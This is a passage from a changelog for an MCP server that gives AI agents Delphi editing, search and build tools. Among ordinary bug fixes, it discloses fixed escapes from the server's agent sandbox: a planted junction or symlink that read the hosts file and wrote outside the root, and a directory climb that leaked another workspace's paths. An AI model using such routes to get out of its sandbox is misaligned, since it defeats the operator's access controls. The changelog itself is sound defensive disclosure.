  outside path to each of the 37 local ones, and checks that the same call
  INSIDE the jail still passes. **Against 1.0.11 it finds, by name and with
  nobody looking for them, the two leaks this release fixes.**
- Three batteries were passing green while leaning on that stray file in
  `%TEMP%`; `test_round30` no longer leaves it there and
  `test_round38`/`test_round41` now ship a real `.dproj`.
- `test_round43` and `test_round44` now tell apart "the tool is broken" from
  "this machine cannot capture the screen right now", and SAY which checks
  they did not measure. A battery that stays silent about what it did not
  measure is a battery lying in green.
- Suite: 67 batteries, 1534 checks, 0 failures.

### Known and not fixed
- **`out` is a FOLDER in `delphi_desktop` and a FILE in `delphi_adb`** - same
  family, same parameter name, different contract. Noted where it is.
- **The gate does not read `[RutaDelServidor]` yet.** The attribute is
  declared and complete; wiring it is next, and then the ~60 hand-written
  decisions become a belt over braces instead of the only line of defence.
- **A rarer race when creating a unit**, seen ONCE and not reproduced in 16
  further runs. Recorded as seen-once, not as fixed.

## [1.0.11-beta] - 2026-09-21

**What the server let out of the jail.** Four fixes with one thread running
through them: something composed here - a path, a scope, a drive prefix -
left this machine, or reached into it, without passing the one place that
decides. Three of the four were found BY USING the server, not by looking
for them, and one of those was found while cutting this very release.

### Fixed - a scan that walked out of the workspace
`delphi_references` could open and read sources belonging to ANOTHER
workspace, and then die publishing their paths. The chain, measured:

1. the search for a unit's project settings climbed **eight levels without
   checking the jail**, so a stray `fuera-de-la-jaula.dproj` of 10 bytes left
   in `%TEMP%` by a battery became the "project" of any unit below it;
2. that made the unit's `RootDir` the whole of `%TEMP%`;
3. and the scan added `RootDir` to its scope **without the jail check that
   the two sibling additions right below it both perform** - one of three,
   and the only one unguarded;
4. so the scan enumerated **168 sources across other jails**, opened them,
   and the guard killed the call with a refusal that printed the foreign
   path.

This server serves several `[Workspace.X]` with different tokens, and jails
can be shared by several agents, so that last step is not cosmetic: a client
of workspace A learned paths inside workspace B. Cut in both places - the
climb stops at the edge of what this workspace may read (`PuedoSubirA`), and
the scope takes the same filter as its siblings.

**Behaviour change worth knowing:** a `.dproj` sitting ABOVE the workspace
root is no longer adopted. If a project is laid out with the root at `src\`
and the `.dproj` one level up, point the root at the project folder.

### Fixed - a name in a comment is not a reference
A candidate inside a comment or a string literal resolved to nothing, exactly
like a candidate the validation ran out of budget for, and both landed in
`unverified`. "I don't know" and "I know it isn't" are not the same thing,
and the confusion was expensive: `delphi_rename_symbol` refuses on a SINGLE
unverified candidate, so documenting an identifier made that tool useless on
it. Measured on this repo's own `MaskDriveText`: 18 confirmed, 6 unverified,
**all six comments**.

They now go to `mentions`: listed, never a blocker, and reported by the
rename as a warning - because the old name really does stay written there.
The classifier is lexical and runs inside the sequential scan that already
existed, because a block comment crosses lines. It handles `//`, `{ }`,
`(* *)`, `{$...}` and string literals, including the two cases that separate
a correct implementation from a naive one: `'http://x'` does not open a
comment, and `'don''t'` does not leave a string open.

A mention also no longer spends candidate budget or opens a file to validate
it - the quiet second cost of the same bag.

### Fixed - the real drive letter escaped through two echoes
`MaskDriveText` exempts six tools wholesale, and rightly: their answer is
LITERAL disk content, and a masked anchor would not match the file. But the
exemption is per TOOL and only the ECHO deserves it. Two lines that these
tools compose THEMSELVES were going out with the server's real drive letter:

- `delphi_textedit`'s `CREADO <path>` - while its twin `delphi_edit` printed
  only the file name, which is how two twins drift;
- `delphi_edit`'s `copia=<path>`, which says where the backup landed. **This
  one escaped the first sweep and was caught by the tool itself while cutting
  this release**: the sweep searched for the identifier instead of for the
  FORMAT, which is precisely what this repo's own rule says not to do.

Both now go through the single masker. The obligation that comes with being
on the exemption list is written at the exemption itself, where a comment
previously claimed - falsely - that these echoes carried no absolute paths.

### Fixed - one namer for the virtual units
David asked whether masking and unmasking the drive units went through one
function. Measured: the READER was one (`VirtualUnitLetter`, whose own
comment says the shape is never re-tested by hand) and the WRITER was **four
hand-built copies** - the three forms of `MaskDriveText` and the valid-units
list of `PathAnomaly`. Three of them did `UpCase` first; the fourth relied on
`ServedDriveLetters` promising upper case four hundred lines away. None was
wrong; that is how one of them drifts.

`VirtualUnitOf` now composes it, written next to the function that reads it,
as its inverse. **This is the same shape as the trash-naming bug of 1.0.9,
one day later, in the server's own wire contract** - unifying the reader
feels like finishing, and is not.

### Known and not fixed
Current as of this release, and measured rather than remembered:
- **The server writes its temporary files to the MACHINE's `%TEMP%`**, in
  seven places, outside every jail, and does not clean them up: 56.4 MB
  measured on 2026-09-21 (33 desktop screenshots from two days earlier, and
  a 10.7 MB remoterun output). On a shared jail those are one agent's
  artifacts sitting where anything on the machine can read them.
- **A screenshot cannot be downloaded.** `delphi_desktop` leaves the capture
  in `%TEMP%` and answers "bajala con delphi_fetch", but `delphi_fetch`
  checks the jail, and `%TEMP%` is inside nobody's. The flow is broken end to
  end. Both of these land next.
- **A rarer race when creating a unit**, seen ONCE and not reproduced in 16
  further runs. Recorded as seen-once, not as fixed.

The *commit line count off by one* of 1.0.10 is **removed from this list**:
it was never re-measured and could not be reproduced. The edit tools were
measured instead and preserve a missing final newline exactly, which was the
only mechanism that would have produced it. A claim nobody can reproduce is
not a known bug, it is a rumour that sends you to fix healthy code.

### Measured
- `tests/test_round40.py` (13 checks, 2 failing against 1.0.10 and 2 more
  against the first fix of the day), `test_round41.py` (11, all 11 failing
  against 1.0.10), `test_round42.py` (8, 6 failing against 1.0.10, in both
  directions).
- `test_round30` no longer leaves its out-of-jail bait loose in `%TEMP%`, and
  `test_round38`/`test_round41` now ship a real `.dproj`: **three batteries
  were passing green while leaning on that stray 10-byte file**, which the
  jail fix exposed.
- Suite: 64 batteries, 1513 checks, 0 failures.

## [1.0.10-beta] - 2026-09-20

Four answers that were correct and unreadable. None of them broke anything;
each of them cost a call, which is how an agent's context gets spent without
anybody writing it down.

### Fixed
- **Six tools said they accept a FOLDER.** `delphi_definition`,
  `delphi_hover`, `delphi_completion`, `delphi_signature` and friends
  inherited their `path` description from a base class shared with
  `delphi_symbols` — the one tool that really does take a folder. Sharing the
  base class made them share a description that was true in exactly one of
  them. The shared-helper smell, running backwards: `delphi_symbols` no
  longer descends from it, because its `path` is a different parameter.
- **`git diff` on a clean tree answered `exit=0` and nothing else.** That is
  indistinguishable from a response that broke on the way, and the first
  thing anyone does with a broken response is send it again. Silence means
  something different per command, so now it says which: "no differences" for
  `diff`, "this command prints nothing when it succeeds" for the rest.
- **`delphi_diagnostics` documented three severities and emitted four.** The
  LSP scale is 1=error, 2=warning, 3=information, 4=hint; the description
  stopped at "3=hint", so a diagnostic arriving as 4 had nothing to read it
  by. The `hints` counter groups 3 and 4 and now says so.
- **A bare `null`.** Four characters as a whole answer: correct — the engine
  resolved nothing — and unreadable. It does not distinguish pointing at the
  wrong place from missing project settings from there being no symbol there,
  and those are fixed three different ways. The three causes are listed now,
  in frequency order, starting with the 0-based/1-based one.

### Known and not fixed
Current as of this release, and measured rather than remembered:
- **`delphi_references` lists as `unverified` candidates that are inside
  strings and comments**, which makes renaming a short identifier awkward.
- **A rarer race when creating a unit**, seen ONCE and not reproduced in 16
  further runs. Recorded as seen-once, not as fixed.
- **A commit line count off by one**, noted during the day and NOT
  re-measured since — treat the claim itself as unverified. Today an
  identical entry on this list (`const` reported as `variable`) turned out to
  be false when measured.

### Measured
- `tests/test_round39.py`: 8 checks, 7 of which fail against 1.0.9. Suite: 61
  batteries, 1482 checks, 0 failures.

## [1.0.9-beta] - 2026-09-20

**One namer.** David asked a single question about 1.0.8 — *"did you
centralise the file naming in the trash, or is it written in several
places?"* — and the answer was the second one. 1.0.8 unified the READER and
left three WRITERS, which is fixing the edge and leaving the point: the very
habit this repo's `CLAUDE.md` exists to break.

### Fixed — three conventions for the same trash
Three places composed paths inside `__delphi-patch`, each with its own shape:

```
delphi_delete   __delphi-patch\<day>\deleted\UFicha.pas-215825250   9-digit stamp
a pre-edit copy __delphi-patch\<day>\UMain.pas                      no stamp
a pre-restore   __delphi-patch\<day>\UMain.pas.antes-restaurar-221530   6-digit, other shape
```

The reader added in 1.0.8 only understood the first, so the copy taken before
a `restore` — the one that holds what you are about to lose — **could not be
found by `delphi_list includetrash` and could not be properly restored**: the
`*.pas-*` mask does not match `.pas.antes-restaurar-`, and the unit path reads
that as an unknown extension, which is the `.dfm`-left-behind bug again.

- There is now ONE namer (`TrashDayDir` + `TrashStampedName`) and the reader
  is its inverse. The stamp is always `-hhnnsszzz`; what distinguishes one
  kind of copy from another is its **drawer**, not its name, so a pre-restore
  copy lives in `<day>\antes-restaurar\` next to `<day>\deleted\`.
- Nobody composes those paths by hand any more, which is the point: a new kind
  of copy cannot invent a fourth convention.
- `BACKUP_SUB` was declared twice, in two units. A repeated constant is a
  convention waiting to drift; its owner declares it now.

### Measured
- `test_round37` grew to 16 checks; the two new ones fail against 1.0.8,
  which was released an hour earlier. Suite: 60 batteries, 1474 checks, 0
  failures.

## [1.0.8-beta] - 2026-09-20

Four items off the *known and not fixed* list, and the thread running through
all of them is the same one as the whole month: **the server answered
something false, confidently, and an agent would act on it.**

### Fixed — a virtual method and its override are the SAME method
- **`delphi_references` on a virtual said "nobody calls it"** and filed the
  override AND every real call site as homonyms. A call through a variable of
  the child class always resolves to the child, so asking from the base got
  back only its own two declaration lines. An agent reads that, concludes the
  virtual is dead code and deletes the base of the hierarchy.
- This is the **second kind of twin**. v1.0.4 fixed the first one (a Pascal
  routine has two definition lines and asking from one threw away the other's
  references); this is the same shape one level up, in the inheritance chain.
- The union is **strict**: same identifier AND the two owning classes related
  by inheritance. Two unrelated classes with a method of the same name stay
  homonyms — measured, in both directions. The hierarchy is built from the
  sources the scan already reads, so it costs no extra I/O.
- Family members come back marked `via: "override"` rather than disguised as
  direct uses, with a note warning that a rename has to take the whole family
  at once or the override stops overriding.

### Fixed — the recoverable trash could be neither found nor fully restored
Three items recorded as separate bugs, **one cause**: `delphi_delete` parks a
file as `UFicha.pas-215825250` — the timestamp goes AFTER the extension, which
is what stops two deletions of the same file colliding, and what breaks
everyone who looks at the extension.

- **`delphi_list includetrash=true` showed the backups and hid the deleted
  files** — the `*.pas` mask does not match `UFicha.pas-215825250`. So the
  flag showed what you were not looking for and hid the one thing it promises.
- **Restoring a form unit left its `.dfm` behind.** The "this is a unit" path
  reads the extension, saw `.pas-215825250` and never entered, so the restore
  produced a unit with no designer — which the IDE will not open. The twin is
  now *searched for* rather than computed, because the `.dfm` copy carries its
  own timestamp (measured: `.pas-215825250` next to `.dfm-215825248`).
- **Restoring made a trash inside the trash**, with the timestamp doubled, and
  every restore added another layer. What is being restored does not need a
  safety net: it IS the safety net.

### Fixed — `occurrence` out of range was ignored
- Asking for occurrence 3 of an anchor that appears ONCE resolved to 0, the
  engine read that as "no tie-break given" and edited the only one there is,
  answering OK. The parameter that exists so you do not write in the wrong
  place was sending you to the wrong place. It now refuses and says how many
  there actually are. (With a REPEATED anchor the ambiguity check already
  caught it, by another door and with a message that never mentioned
  `occurrence` — which is why this had gone unnoticed.)

### Measured
- `tests/test_round37.py` (12 checks, 7 fail against the previous build) and
  `tests/test_round38.py` (9 checks, 5 fail). `test_round35` grew to 27.
  Suite: 60 batteries, 1471 checks, 0 failures.

## [1.0.7-beta] - 2026-09-20

`delphi_symbols` was answering **false signatures with confidence**, which is
the worst thing a reading tool can do: an agent respects the signature it is
given and writes a call that does not compile.

### Fixed — the signatures are read from the source now
DelphiLSP's `documentSymbol` does not return a *name*: it returns a **rendered
signature**, and the rendering is lossy. Measured with a probe unit:

```
source:    function Alta(const A: string; B: Integer = 0): Boolean;
DelphiLSP: Alta(const A: string; B: Integer): Boolean
source:    FBuffer: array [0 .. 7] of Byte;
DelphiLSP: FBuffer: Byte
```

An optional parameter passes for a mandatory one and an array disappears
entirely. The tree, the kinds and the line numbers are still the language
server's — the only thing no longer believed is **how it writes a
declaration**.

- The correct reader **already existed in the same unit**: the folder digest
  reads the source as text and gets every default and every array bound right.
  The single-file path ignored it and trusted the LSP. It is now one function,
  `StatementAt`, with two callers — not a second parser.
- One pass decorates the tree with the real declaration, and the three modes
  (`full`, `summary`, `filter`) read from it. Three renderers would have
  drifted apart, which is how every twin bug of this month started.
- **A global routine no longer announces itself as `method`.** DelphiLSP uses
  SymbolKind 6 for any routine; the real declaration says `function` or
  `procedure` on its own, so the kind word in front was both redundant and
  wrong.
- **`filter` searches by NAME again.** It was matching inside the rendered
  signature, so `filter="string"` returned nine symbols because of their
  *type*, in a parameter documented as "search by name". Hits now carry a
  clean `name` and the real `decl` beside it, and an empty result explains
  that this is a name search and `delphi_search` is the text one.
- **A `.dpr` no longer comes back as empty sections.** Its tree is flat — every
  routine at the root with no children — and rendering the root as "sections"
  produced thirteen of them with `"symbols": []`, which reads as "this routine
  contains nothing". What has no children is not a section; it is a top-level
  symbol.
- **A comment line is no longer glued inside a declaration** when joining the
  lines of a multi-line one: `property Larga: string { a note } read FNombre;`
  was a real answer from the folder digest.

### Fixed — a refusal that had been giving stale advice for a month
- The multi-line anchor refusal sent the caller to **"one call per line"**.
  That was true in August and stopped being true twice: when `edits` accepted
  BLOCK anchors, and again when `toline` arrived. It now names both. The two
  tools had **different wordings of the same rule** and only one of them was
  wrong in an interesting way, so they share the text now.

### Correction to this file
The *Known and not fixed* list of 1.0.5 said `delphi_symbols` reports `const`
as `variable`. **That is false** — measured: an interface `const` comes back as
SymbolKind 14 (constant) and a `var` as 13 (variable), both correct. It was
recorded from memory instead of from a measurement, and it would have sent
somebody to fix something that was not broken.

### Measured
- `tests/test_round36.py`: 16 checks, 14 of which fail against the previous
  build. Suite: 58 batteries, 1446 checks, 0 failures.
- **The summary costs 7% more now, deliberately.** Telling the truth is longer
  than the LSP's rendering: 11.9k chars before, 17.3k unbounded, 12.9k with a
  110-character cap per label and no trailing `;`. `test_round16`'s ceiling
  went from 12k to 14k with the measurement written next to it — the full tree
  is still over 38k.

## [1.0.6-beta] - 2026-09-20

The first release written entirely through the server itself, and the first
one that closes a **wall** — something the tools genuinely could not do —
instead of a bug. A wall is worth more than a bug report: it is the roadmap.

### Added — the anchor can be a RANGE
- **`toline` on `delphi_edit` and `delphi_textedit`**, in the single form and
  inside `edits`. With it, `old` stops being the line to touch and becomes the
  FIRST line of a stretch that ends at `toline`, included: `delete:true`
  removes them all, `new` replaces them all. Dropping a 40-line method used to
  mean pasting all 40 as a block anchor, or forty calls. Hit three times in
  one day of using the server as a client.
- The range is **one helper, `RangoHasta`, for both engines**. A range has
  nothing of Pascal and nothing of Markdown in it, and the three twin bugs of
  this month were all born from writing the same rule twice.
- **Inside a batch the range is dragged**, exactly like `occurrence`: if an
  earlier entry adds or removes lines, `toline` corrects itself. A fixed
  number there would be the `occurrence` bug again, this time carrying lines
  away with it.
- Three refusals, all before anything is written: a range that runs backwards,
  one that runs past the end of the file, and one that **swallows the file
  whole** — that last is rewriting a file from scratch through the side door,
  and that was already forbidden through the front one.

### Fixed — a field nobody knew was being ignored
- **An unknown field inside an `edits` entry was swallowed in silence.** The
  entries are read by hand, field by field, so they never got the
  `Unknown parameter` answer the tool's own parameters get: a typo
  (`occurence` with one `r`, `atlines`) left the entry doing the default thing
  and answering OK. Found by measuring the new battery against the previous
  binary — `toline` went in without a word and did nothing. Now the whole
  entry is checked first and a bad field is refused by name.
- **The high-byte audit of `delphi_edit` counted what the ANCHOR took out**,
  not what actually left. With a range that is wrong by every line below the
  anchor, so any accent inside the stretch would fire *ACCENTS OUT OF LINE* —
  the alarm that tells an agent to stop and restore. It now counts the real
  removed text.
- **`delphi_textedit` carried its own hand-copied version of the `edits`
  description**, almost but not quite the same as `delphi_edit`'s.
  Documenting the range in one of them would have left half the feature
  invisible to whoever used the other. Both now read one shared constant.
- The `delphi_edit` parameter table in `docs/TOOLS.md` got its **`edits` row**,
  which had never been there — the very drift the page's own warning banner
  names. `toline` went in at the same time, on both tools.

### Measured
- `tests/test_round35.py`: 24 checks. Against the previous build 15 of them
  fail, which is the only thing that makes a battery worth having. Suite: 57
  batteries, 1430 checks, 0 failures.

## [1.0.5-beta] - 2026-09-20

Three more agents were pointed at the server as clients. Between them and the
work that followed: a real jail escape, a write path that corrupted code
silently, and four duplications that were each holding a family of bugs.

### Fixed — the jail was measured on a name, not on a destination
- **A junction or symlink inside the root escaped it, for reading AND for
  writing.** The boundary check validated the path as TEXT while the file
  system dereferenced the reparse point to its target. A junction planted in
  the root let `delphi_list` list `C:\Windows\System32\drivers\etc`,
  `delphi_read` return the machine's hosts file, and `delphi_textedit` create
  a file OUTSIDE the root. It did not need a console to plant: a `git clone`
  with `core.symlinks` brings the link in without leaving the MCP. The jail is
  now measured on the real destination, and `test_round33` reproduces the
  escape — it fails against the previous build, which is the only thing that
  makes a battery worth having.
- **`ReadOnlyPaths` per workspace**: folders inside the jail that are read and
  never written. Third-party code often has to live inside the project — that
  is where whoever clones it will look — and when that folder is *another git
  repository*, a careless write does not even show up in the main repo's
  `git status`. Now the server enforces it instead of the agent remembering.

### Fixed — writes that reported success while writing the wrong line
- **`occurrence` inside a batch was recounted against the ALREADY MUTATED
  file**, which is the exact opposite of what its own parameter description
  promises. Asking for occurrences 1, 2 and 3 left 2 and 3 swapped; deleting 1
  and 2 deleted 1 and 3; both answered OK. Occurrences are now resolved once
  against the original and dragged as earlier entries add or remove lines.
  The bug had **three doors** — `delphi_edit`, `delphi_textedit` and block
  anchors — because the batch loop was written twice and blocks went through a
  third function. All three are closed, and there is now one loop.
- **A batch returns a verification echo.** A single edit has always re-read
  from disk and shown the result; a batch only said `OK: <anchor>` — what you
  asked for, not what happened. The tool recommends batches for refactors,
  which is exactly when it matters: with `occurrence` writing in the wrong
  place, an agent had no way to notice.
- **A block edit that adds or removes lines now shifts the pending
  occurrences.** That branch left the loop just above the shift, so it moved
  nothing — a hole that was invisible while the two branches were apart.

### Fixed — tools that answered confidently about a position nobody could point at
- **`delphi_completion` answered `ok: true` with 16835 candidates to a
  NEGATIVE column**, and two items to line 9999 of a 519-line file.
  `delphi_signature` blamed the parentheses for a line that does not exist.
  Four of the six position-taking tools validated and two did not, because the
  validation lived in the implementation of one tool's unit, invisible to the
  others. It moved; all six share it.
- **`delphi_rename_symbol` duplicated the definition row in every rename**,
  and — worse — omitted it when a confirmed occurrence sat on the line just
  above the definition, which is exactly the `E2065 Unsatisfied forward` the
  comment above it claimed to have fixed. It compared a 1-based number against
  a 0-based one. It now compares `line0`, and reports `changesCount` so the
  extra definition row is never mistaken for a duplicate.
- **`delphi_references` capped its rejected list.** For a short identifier it
  returned 212 homonyms with full text: 78 KB that the client refused
  entirely, so the agent did not even see the 8 real references.

### Fixed — the drive mask, in the one place it lives
- **`<letter>:` with no separator leaked the real drive letter** — `root="D:"`,
  `repo="C:"`, `project="D:foo\bar"` — in every tool that echoes a path in its
  refusal. Combined with `C:\Windows` correctly masking to `srvc:`, a reader
  could invert the whole mapping. Fixed in the single outbound masker; an
  earlier attempt had patched one emitter instead, which is precisely how it
  survived in eight other tools.

### Fixed — a race that had 32 doors
- **Creating a directory checked whether it existed and THEN created it.** Two
  threads both answer "no", both create, and the loser gets "cannot create a
  file when that file already exists". The concurrency battery catches it now
  and then — 7 of 8 reports arriving — and it was the same race
  `delphi_report` already solved for the FILE name with `CREATE_NEW`, twelve
  lines below where it left it open for the DIRECTORY. All 32 call sites now
  go through one helper. Only one of the 32 had ever shown its face.

### Changed — four duplications removed
Not tidiness: each one was holding a family of bugs, and three of the four
were found by asking where else the rule lives rather than by a failure.
`AplicaTanda` (one batch engine instead of two, 78% identical),
`CrearCarpeta` (one helper instead of 32 sites), `CanonicalSubiendo` (one
walk-up instead of two) and `PositionOutOfRange` (one validation instead of
four-and-a-half). The binary is smaller than before.

### Known and not fixed
Said plainly rather than left to be discovered: `delphi_symbols` fuses
optional parameters into mandatory ones, reports `const` as `variable` and
`array [0..7]` as `array of` — false information about signatures, which is
what hurts an agent most; `delphi_list includetrash=true` does not show the
trash, because the recovery suffix breaks the extension mask; restoring a form
unit from the trash leaves its `.dfm` behind; `delphi_references` on an
override answers that nobody calls it; and a rarer race in unit creation, seen
ONCE and not reproduced in 16 further runs.

## [1.0.4-beta] - 2026-09-20

Three agents were pointed at this server and told to use it as a client, not
to test it. Between them they found eleven things, and the thread running
through almost all of them is the same: **the server answered "it isn't
there" when the truth was "it isn't that kind of thing"**, and it counted
things instead of saying them.

### Fixed
- **`delphi_references` answered that nothing uses a routine that has
  callers.** A Pascal routine has TWO definition lines - the forward or
  interface declaration and the implementation - and only one was accepted as
  the target. Asking "who uses this" from the body resolved to one, the call
  sites resolved to the other, and every real use was thrown away as a
  homonym. `OneTool` in `Mcp.Tools.Help.pas` has four uses: asked from its
  body it reported one. The natural flow is exactly the broken one, because
  `delphi_symbols` hands you declaration lines. A wrong answer, not a missing
  one - and the kind an agent acts on by deleting live code. The counterpart
  is now resolved once, up front, and both halves count as one symbol.
- **Discarded candidates are listed, not just counted.** The tool's own
  description promises leftovers are "never silently dropped"; same-file ones
  were dropped with only `rejectedHomonyms: 3` to show for it, which is
  precisely what hid the bug above.
- **`delphi_search` was falsifying the contents of files.** The outbound
  filter that turns server drive letters into virtual units (`D:\` ->
  `srvd:\`) was rewriting them INSIDE the matched line - the field the tool
  publishes verbatim so an agent can copy it as an edit anchor. A line that
  reads `Roots=D:\Projects\Galatea` on disk came back as
  `Roots=srvd:\Projects\Galatea`: no anchor copied from a search hit could
  ever match, and a documentation file was quoted wrong. The tool now masks
  its own `path` fields and its text reaches the client as written.
- **...and the same mask was falsifying `delphi_edit`'s own evidence.** Found
  while writing this entry: the verification echo those tools return is the
  lines RE-READ FROM DISK, which is what an agent checks a write against.
  `D:\Projects\Galatea` went in, the disk held it correctly, and the echo
  came back `srvd:\Projects\Galatea`. A proof that is rewritten before you
  see it proves nothing.
- **MSBuild output was decoded as ANSI instead of the console codepage.**
  They differ exactly on the accented letters, so `raiz`, `linea` and
  `posicion` arrived as `ra¡z`, `l¡nea` and `posici¢n` - mojibake in the
  error text of a server whose headline promise is reading Delphi files
  decoded correctly. Asked to Windows now, with an OEM fallback for the tray
  and the service, which have no console of their own.
- **`delphi_build` ran MSBuild on anything.** There was no type check at all:
  the `<Exec>` hazard scan was a substring search standing in for one, and it
  failed in both directions at once. `CHANGELOG.md` was refused for a build
  task it does not have - the word appears in prose describing that very
  guard - and the refusal named a real config key (`AllowBuildScripts`) for a
  condition that was not happening, so an agent would go ask the operator to
  enable build scripts in order to compile a markdown file. Meanwhile
  `LICENSE`, which contains no "exec" anywhere, sailed past and MSBuild was
  spawned on the text of an MIT licence.
- **21 user-facing texts sent the operator to edit `[Workspace]`, a section
  that has not been read since v0.98.** Two of them shipped inside
  `tools/list`. Worse, a literal `[Workspace]` was explicitly EXEMPTED from
  the "you spelled that wrong" warning, so somebody following our own
  instructions got no jail, no token, and not one word anywhere saying why.
  It now gets the loudest note of the three.
- **`vault_read` named a settings key that exists nowhere**, `VaultRoot`. It
  is `VaultPath=`, per workspace. v1.0.3 fixed this same lie in the refusals
  and missed it in the tool description.
- **A refusal inside a JSON answer travelled with `"ok": true`.** The outcome
  code is derived from the text prefix, and a tool answering a JSON object
  starts with `{`, so no code was derived and the object's own `ok` was left
  alone. A client that branches on `ok` read a refusal as a success - the
  same family as the v1.0.0-beta `structuredContent` regression.
- **"It isn't there" vs "it isn't that kind of thing", both directions.**
  `delphi_read` on the repo root answered "does not exist" about a folder
  with 20 entries; `delphi_list` and `delphi_package` answered "directory not
  found" about a README that is right there. Each now says what the path
  actually is and which tool handles it.
- **A missing file is `error:`, not `RECHAZADO:`.** By this server's own rule
  11, `RECHAZADO:` means "denied on purpose, change course" and `error:`
  means "correct it and repeat" - with a missing file as its literal example.
  An agent that mistyped a filename was being told to give up.
- **The mailbox notice stopped announcing other agents' post.** Six messages
  for named ids, which the reader can neither read nor clear, kept ~90 bytes
  of untrue notice stuck to the end of every single answer - measured over 40
  consecutive calls. A notice that cries wolf on every answer teaches agents
  to skip the one line that matters when the mail really is theirs. Mail
  addressed to everyone still announces itself; the rest is counted in
  `delphi_workspace`, which is the orientation call.
- **`delphi_help command=tasks`, "the map of this server", listed 36 of its
  43 tools.** `delphi_hover`, `delphi_signature`, `delphi_completion`,
  `delphi_installs`, `delphi_adb_linux`, `delphi_desktop` and `delphi_help`
  itself were missing from the first call the manual tells an agent to make.

### Added
- `test_round31.py` - one check per fix above, all of them written from the
  measurement that found it.
- `test_tray.py` - the FIRST battery that ever starts the tray host. All 51
  existing batteries run the terminal host (36 stdio, 13 `--http`); the mode
  that actually runs in production had zero coverage, which is why nothing
  guarded the three things only it does: `FreeConsole`, a VCL message loop,
  and taking its port from `settings.ini` alone.

## [1.0.3-beta] - 2026-09-20

Four things that the day's own use of this server turned up, three of them
refusals or answers that were lying to the agent reading them.

### Fixed
- **A refusal that tells the truth about whose vault is missing.** A workspace
  declaring no `VaultPath` was told "this server has no knowledge vault
  configured (`[Vault] Path` in settings.ini)". Both halves were false since
  v0.98: the server may well have a vault — another workspace's — and that
  section does not exist any more. Worse, a workspace with a WRITE token but no
  vault got "the vault is READ-ONLY (`[Vault] ReadOnly=1`)", sending its
  operator to remove a flag that was not there. Missing and read-only are two
  different things and are now told apart, both naming the key that exists
  (`VaultPath=` / `VaultReadOnly=` in `[Workspace.<name>]`) and offering
  `delphi_report` as the way to ask. The vault tools stay visible to every
  workspace on purpose — they register when ANY workspace declares one — so
  that refusal is the only thing such an agent gets.
- **`delphi_edit` showed the wrong lines back.** The verification echo looked
  for the first line of the new text from the TOP of the file, so when that
  line was a common one — a `begin`, a `var` — the agent checked its edit
  against a different part of the file. It uses the known edit position now,
  and the window covers the whole block written instead of its first two lines.
- **A Linux build no longer dumps the linker command line.** Some 2 KB of
  repeated `-L` paths in EVERY build. What is kept is the part anyone reads:
  the `--sysroot` (which SDK it linked against) plus the count of the rest.
  Measured on a real build: the tail went from ~2.5 KB to 476 bytes.

### Added
- **`delphi_textedit` anchors can be blocks too**, like `delphi_edit`'s: a
  contiguous run of lines in `old`, matched whole, plus `occurrence` to pick
  which one when it repeats. The two routines that did this moved into
  `Lsp.Patch` so both tools share them instead of one owning them.
- **`delphi_build` takes `verbosity`, the same contract as the house build
  script** (`quiet` by default, `normal`, `verbose`) — and it sets the msbuild
  verbosity too, so `quiet` really does ask for less instead of hiding it. In
  `quiet` there is no `warnings` array at all: an empty one would read as "no
  warnings" when the truth is "not asked for". The build answer also stopped
  repeating in `outputTail` what already travels in `errors`/`warnings`.
  Measured on this repo: a routine build went from 3.4 KB to 743 bytes. On a
  project that compiles clean the saving is nil — the win is exactly where the
  noise is. **A project no longer needs its own .bat to build cheaply**; the
  one it keeps is for ITS ritual (build number, EurekaLog, signing, data).
- `tests/run_all.py` says when another regression is still running instead of
  dying with a bare `FileExistsError` — two suites share the temp folder and
  step on each other.

Regression: **51 batteries | 1330+ checks | 0 failures**.

## [1.0.2-beta] - 2026-09-20

Everything here was found by **using this server as an agent** on its own
repository, not by testing it: the rule now lives in `CLAUDE.md`.

### Added
- **`delphi_workspace` says WHO is answering.** A `server` block with version,
  how the process was started (tray / service / console), transport, pid, exe,
  start time and uptime. Nothing said it before: the version lived in the tray
  caption and inside a `delphi_report`, so checking a deployment meant looking
  at the machine from outside the MCP.
- **`delphi_textedit` gained what `delphi_edit` already had**: `edits`, several
  changes to the SAME file in one ALL-OR-NOTHING call (a failing entry puts the
  file back byte for byte), and `delete` to remove a line entirely. A
  three-line comment used to cost three calls, with the file half done between
  them.
- **`delphi_config command=set-version`**: the project version, written where
  it has to agree with itself - the Windows VERSIONINFO numbers AND the
  `FileVersion`/`ProductVersion` keys, which is exactly what drifts when a
  release is cut by hand. Android (`versionCode`/`versionName`) and iOS
  (`CFBundleVersion`) are left alone: that numbering is a different thing.
  Until now, bumping the version was the ONE step of the release ritual that
  forced an agent out of the MCP, because both editing tools refuse the
  `.dproj` on purpose - it is XML with property groups repeated per platform,
  where a line anchor hits the wrong group without saying so. The answer was
  not to open the door but to add the curated operation, like `set-sdk`.
- **`delphi_projects` answers in pages** (`maxresults`, default 50, plus
  `offset`/`nextOffset`) and, when there are more, reports `byFolder` - the ten
  folders holding the most.

### Fixed
- **Text arrives as it is written.** `LoadSourceText` assumed CP1252 whenever a
  file had no BOM, so every UTF-8 file without one came back as mojibake:
  searching this repo's own README answered three junk characters for each em
  dash. That reader also feeds `delphi_references` and the text handed to the
  linter - and the corrupted text is exactly what an agent copies to build a
  `delphi_edit` anchor. It now uses the same detector `delphi_read` has always
  used (utf8 only when EVERY high byte forms a valid sequence), so legacy
  CP1252 sources still decode as CP1252.
- **A broad jail made `delphi_projects` unusable.** With a whole drive as root
  the answer was 7025 projects and 82 KB, past the client's limit - and 6420 of
  those were third-party component sources and their backups while the
  operator's own were 73. Paging fixes the size; `byFolder` fixes the rest.

Regression: **51 batteries | 1309 checks | 0 failures**.

## [1.0.1-beta] - 2026-09-20

### Fixed
- **The server was answering nothing to the clients that matter.** Any tool
  whose answer is prose — `delphi_read`, the most used tool here;
  `delphi_help`, the very first call the manual tells an agent to make;
  `delphi_git status` — reached the agent as `{"ok": true}` and not one line
  of content. Measured against the production build over HTTP.
  The cause is a field, not the tools: the result always published
  `structuredContent`, and a client that understands that field **shows it
  and hides `content`**, which is where the text travels. The 1.0.0-beta
  repair only covered answers that are JSON (their JSON becomes the
  structured output); prose answers kept the `{ok, code}` placeholder and
  the agent saw the placeholder instead of the answer.
  From here: a prose success publishes **no `structuredContent` at all** —
  the field is the tool's output for the protocol and only means something
  when the tool declares an `outputSchema`, which none of these do. A prose
  failure still publishes it, because the agent needs the `code`, and now
  carries its text inside so the reason cannot disappear either. A JSON
  answer is unchanged: it IS the structured output.
  `tests/test_round17.py` now requires the three shapes (prose success,
  JSON success, prose failure with its text).

## [1.0.0-beta] - 2026-09-20

### Fixed
